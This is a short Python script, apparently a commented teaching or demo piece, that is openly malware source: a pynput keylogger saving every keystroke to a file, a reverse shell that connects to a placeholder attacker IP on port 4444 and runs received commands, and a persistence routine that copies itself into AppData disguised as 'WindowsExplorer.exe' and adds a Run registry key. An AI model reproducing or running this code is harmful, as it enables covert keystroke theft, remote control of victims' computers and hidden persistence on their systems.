import os
import socket
import threading
import pynput  # Python module that can monitor and control input device like keyboard and mouse
import time

def keylogger():
    from pynput.keyboard import Listener
    def log(key):
        with open("keys.txt", "a") as file:
            file.write(str(key) + "\n")
    with Listener(on_press=log) as listener:  # Ever time if key is pressed, log function is called which store every keystroke to keys.txt file.  
        listener.join()

def reverse_shell():
    s = socket.socket()
    s.connect(("AttackeIP", 4444)) # It creates a TCP socket and connects to the attacker's IP address and port 4444
    while True:
        command = s.recv(1024).decode() # Receive command from the attacker in byte formate which is converted to strings using decode function
        if command.lower() == "exit":
            break
        output = os.popen(command).read()  # This line received command locally like {{type keys.txt}}, reads the output, and sends the result back to the attacker
        s.send(output.encode())

def persist():
    location = os.getenv("APPDATA") + "\\WindowsExplorer.exe"  #It Gets the AppData path for the current user so at last location becomes a path like:
# C:\Users\krish\AppData\Roaming\WindowsExplorer.exe
    if not os.path.exists(location):
        os.system(f'copy "{__file__}" "{location}"') # Copy the current script to location path
        # A window registry is a hierarchical database which stores system settings, user preferences, software configs, and startup programs.
        # A Windows Registry command that add a new registry under Run and runs automatically at startup or when booting.
        reg = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v explorer /t REG_SZ /d "{location}"'
        os.system(reg)

# Threading for multi-function
threading.Thread(target=keylogger).start()
threading.Thread(target=reverse_shell).start()
